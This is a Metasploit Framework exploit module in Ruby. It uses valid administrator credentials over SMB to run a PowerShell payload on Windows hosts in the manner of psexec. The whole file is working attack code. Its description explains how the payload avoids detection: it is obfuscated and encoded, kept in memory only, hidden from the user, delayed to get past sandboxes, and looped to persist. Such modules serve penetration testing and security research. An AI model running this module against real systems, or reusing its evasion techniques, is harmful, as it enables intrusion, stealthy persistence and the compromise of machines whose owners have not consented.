# -*- coding: binary -*-

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/exploit/powershell'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::SMB::Psexec
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Windows Authenticated Powershell Command Execution',
      'Description'    => %q{
          This module uses a valid administrator username and password to execute a powershell
        payload using a similar technique to the "psexec" utility provided by SysInternals. The
        payload is obfuscated, gzip compressed, then encoded in base64 and executed from the commandline
        using the -encodedcommand flag. Using this method, the payload is never written to disk, and
        given that each payload is unique, is not very prone to signature based detection on the wire.
        Since executing shellcode in .NET requires the use of system resources from unmanaged memory space,
        the .NET (PSH) architecture must match that of the payload. Lastly, a persist option is provided
        to execute the payload in a while loop in order to maintain a form of in-mem persistence. In the event
        of a sandbox observing PSH execution, a delay and other obfuscation may be added to avoid detection.
        In order to avoid interactive process notifications for the current user, the psh payload has
        been reduced in size and wrapped in a powershell invocation which hides the window entirely.
      },

      'Author'         => [
        'Royce @R3dy__ Davis <rdavis[at]accuvant.com>', # PSExec command module
        'RageLtMan <rageltman[at]sempervictus' # PSH exploit, libs, encoders
      ],

      'License'        => MSF_LICENSE,
      'Privileged'     => true,
      'DefaultOptions' =>
        {
          'WfsDelay'     => 10,
          'EXITFUNC' => 'thread'
        },
      'Payload'        =>
        {
          'Space'        => 8192,
          'DisableNops'  => true,
          'StackAdjustment' => -3500
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jan 01 1999',
      'References'     => [
        [ 'CVE', '1999-0504'], # Administrator with no password (since this is the default)
        [ 'OSVDB', '3106'],
        [ 'URL', 'http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access' ],
        [ 'URL', 'http://sourceforge.net/projects/smbexec/' ],
        [ 'URL', 'http://technet.microsoft.com/en-us/sysinternals/bb897553.aspx' ]
      ]
    ))

    register_options([
      OptBool.new('DryRun',[false,'dry run',false]),
    ], self.class)
  end


  def exploit
    command = cmd_psh_payload(payload.encoded)
    if datastore['DryRun']
      print_good command
      return
    end

    if datastore['PSH::RUN_WOW64'] and target_arch.first == "x86_64"
      fail_with(Exploit::Failure::BadConfig, "Select an x86 target and payload with RUN_WOW64 enabled")
    end

    # Try and authenticate with given credentials
    if connect
      begin
        smb_login
      rescue StandardError => autherror
        fail_with(Exploit::Failure::NoAccess, "#{peer} - Unable to authenticate with given credentials: #{autherror}")
      ensure
        disconnect
      end
      # Execute the powershell command
      print_status("#{peer} - Executing the payload...")
      begin
        return psexec(command)
      rescue StandardError => exec_command_error
        fail_with(Exploit::Failure::Unknown, "#{peer} - Unable to execute specified command: #{exec_command_error}")
      ensure
        disconnect
      end
    end
  end

  def peer
    return "#{rhost}:#{rport}"
  end
end

